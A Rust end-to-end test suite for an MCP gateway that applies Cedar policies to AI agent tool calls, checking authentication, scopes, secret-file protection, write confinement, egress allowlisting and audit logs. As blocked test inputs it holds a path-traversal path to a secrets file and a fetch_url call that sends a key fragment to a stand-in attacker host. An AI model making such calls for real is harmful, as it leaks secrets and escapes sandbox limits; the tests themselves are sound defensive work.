//! End-to-end tests of the MCP endpoint with the real Cedar policies.

use std::{fs, path::PathBuf, sync::Arc};

use axum::{body::Body, http::Request, Router};
use http_body_util::BodyExt;
use mcp_gateway::{
    config::{AgentConfig, Config, Mode},
    creds::CredentialIssuer,
    mcp::{router, AppState},
};
use serde_json::{json, Value};
use tower::ServiceExt;

struct Harness {
    app: Router,
    dir: tempfile::TempDir,
}

fn agent(id: &str, role: &str, scopes: &[&str]) -> AgentConfig {
    AgentConfig {
        id: id.into(),
        role: role.into(),
        token: Some(format!("{id}-token")),
        token_env: None,
        scopes: scopes.iter().map(|s| s.to_string()).collect(),
    }
}

fn harness(mode: Mode) -> Harness {
    let dir = tempfile::tempdir().unwrap();
    let ws = dir.path().join("workspace");
    for (p, c) in [
        ("docs/notes.md", "hello"),
        ("secrets/api_keys.env", "OPENAI_KEY=sk-live-123"),
        ("tmp/old.log", "old"),
    ] {
        fs::create_dir_all(ws.join(p).parent().unwrap()).unwrap();
        fs::write(ws.join(p), c).unwrap();
    }
    let all = [
        "list_files",
        "read_file",
        "write_file",
        "delete_file",
        "fetch_url",
        "send_email",
    ];
    let config = Config {
        listen: "127.0.0.1:0".into(),
        workspace: ws,
        policy_dir: PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("policies"),
        audit_log: dir.path().join("audit.jsonl"),
        mode,
        agents: vec![
            agent("hermes", "assistant", &all),
            agent("reporter", "assistant", &["list_files", "read_file"]),
            agent("ops", "operator", &all),
        ],
    };
    let state = AppState::new(config, CredentialIssuer::new(b"test-key".to_vec(), 30)).unwrap();
    Harness {
        app: router(Arc::new(state)),
        dir,
    }
}

impl Harness {
    async fn rpc(&self, token: Option<&str>, method: &str, params: Value) -> (u16, Value) {
        let mut req = Request::post("/mcp").header("content-type", "application/json");
        if let Some(t) = token {
            req = req.header("authorization", format!("Bearer {t}"));
        }
        let body = json!({"jsonrpc": "2.0", "id": 1, "method": method, "params": params});
        let resp = self
            .app
            .clone()
            .oneshot(req.body(Body::from(body.to_string())).unwrap())
            .await
            .unwrap();
        let status = resp.status().as_u16();
        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
        (
            status,
            serde_json::from_slice(&bytes).unwrap_or(Value::Null),
        )
    }

    /// Returns (is_error, text) of a tools/call.
    async fn call(&self, agent: &str, tool: &str, args: Value) -> (bool, String) {
        let token = format!("{agent}-token");
        let (_, v) = self
            .rpc(
                Some(&token),
                "tools/call",
                json!({"name": tool, "arguments": args}),
            )
            .await;
        let r = &v["result"];
        (
            r["isError"].as_bool().unwrap(),
            r["content"][0]["text"].as_str().unwrap().to_string(),
        )
    }

    fn audit(&self) -> Vec<Value> {
        fs::read_to_string(self.dir.path().join("audit.jsonl"))
            .unwrap_or_default()
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect()
    }

    fn ws(&self, p: &str) -> PathBuf {
        self.dir.path().join("workspace").join(p)
    }
}

#[tokio::test]
async fn rejects_unauthenticated_agents() {
    let h = harness(Mode::Enforce);
    assert_eq!(h.rpc(None, "tools/list", json!({})).await.0, 401);
    assert_eq!(h.rpc(Some("wrong"), "tools/list", json!({})).await.0, 401);
}

#[tokio::test]
async fn initialize_and_list_tools_respects_scopes() {
    let h = harness(Mode::Enforce);
    let (_, v) = h.rpc(Some("hermes-token"), "initialize", json!({})).await;
    assert_eq!(v["result"]["serverInfo"]["name"], "mcp-gateway");

    let (_, v) = h.rpc(Some("reporter-token"), "tools/list", json!({})).await;
    let names: Vec<_> = v["result"]["tools"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| t["name"].clone())
        .collect();
    assert_eq!(names, vec![json!("list_files"), json!("read_file")]);
}

#[tokio::test]
async fn reads_are_allowed_but_secrets_are_forbidden() {
    let h = harness(Mode::Enforce);
    assert_eq!(
        h.call("hermes", "read_file", json!({"path": "docs/notes.md"}))
            .await,
        (false, "hello".into())
    );

    let (err, text) = h
        .call(
            "hermes",
            "read_file",
            json!({"path": "secrets/api_keys.env"}),
        )
        .await;
    assert!(err && text.contains("no-secrets"), "{text}");

    // Even operators can't read secrets: forbid overrides permit.
    let (err, _) = h
        .call("ops", "read_file", json!({"path": "secrets/api_keys.env"}))
        .await;
    assert!(err);

    // Path traversal is rejected before policy evaluation.
    let (err, text) = h
        .call(
            "hermes",
            "read_file",
            json!({"path": "docs/../secrets/api_keys.env"}),
        )
        .await;
    assert!(err && text.contains("Invalid tool call"), "{text}");
}

#[tokio::test]
async fn writes_and_deletes_are_confined() {
    let h = harness(Mode::Enforce);
    assert!(
        !h.call(
            "hermes",
            "write_file",
            json!({"path": "out/summary.md", "content": "x"})
        )
        .await
        .0
    );
    assert!(h.ws("out/summary.md").exists());

    let (err, text) = h
        .call(
            "hermes",
            "write_file",
            json!({"path": "docs/notes.md", "content": "pwned"}),
        )
        .await;
    assert!(err && text.contains("default deny"), "{text}");
    assert_eq!(fs::read_to_string(h.ws("docs/notes.md")).unwrap(), "hello");

    assert!(
        h.call("hermes", "delete_file", json!({"path": "docs/notes.md"}))
            .await
            .0
    );
    assert!(
        !h.call("hermes", "delete_file", json!({"path": "tmp/old.log"}))
            .await
            .0
    );
    assert!(h.ws("docs/notes.md").exists() && !h.ws("tmp/old.log").exists());
}

#[tokio::test]
async fn egress_is_allowlisted() {
    let h = harness(Mode::Enforce);
    assert!(
        !h.call(
            "hermes",
            "fetch_url",
            json!({"url": "https://docs.company.internal/x"})
        )
        .await
        .0
    );
    assert!(
        h.call(
            "hermes",
            "fetch_url",
            json!({"url": "https://attacker.example/?d=sk-live"})
        )
        .await
        .0
    );
    assert!(
        !h.call(
            "hermes",
            "send_email",
            json!({"to": "team@company.internal", "subject": "s", "body": "b"})
        )
        .await
        .0
    );
    assert!(
        h.call(
            "hermes",
            "send_email",
            json!({"to": "x@evil.example", "subject": "s", "body": "b"})
        )
        .await
        .0
    );

    let outbox = fs::read_to_string(h.ws(".sandbox/outbox.jsonl")).unwrap();
    assert!(outbox.contains("team@company.internal") && !outbox.contains("evil.example"));
}

#[tokio::test]
async fn credential_scope_limits_tools() {
    let h = harness(Mode::Enforce);
    let (err, text) = h
        .call(
            "reporter",
            "write_file",
            json!({"path": "out/a.md", "content": "x"}),
        )
        .await;
    assert!(err && text.contains("credential-scope"), "{text}");
}

#[tokio::test]
async fn every_call_is_audited() {
    let h = harness(Mode::Enforce);
    h.call("hermes", "read_file", json!({"path": "docs/notes.md"}))
        .await;
    h.call(
        "hermes",
        "read_file",
        json!({"path": "secrets/api_keys.env"}),
    )
    .await;
    let log = h.audit();
    assert_eq!(log.len(), 2);
    assert_eq!(log[0]["decision"], "allow");
    assert_eq!(log[1]["decision"], "deny");
    assert_eq!(log[1]["policies"], json!(["no-secrets"]));
}

#[tokio::test]
async fn audit_mode_logs_but_does_not_block() {
    let h = harness(Mode::Audit);
    let (err, _) = h
        .call(
            "hermes",
            "write_file",
            json!({"path": "docs/x.md", "content": "x"}),
        )
        .await;
    assert!(!err);
    assert_eq!(h.audit()[0]["decision"], "deny-audit-only");
}
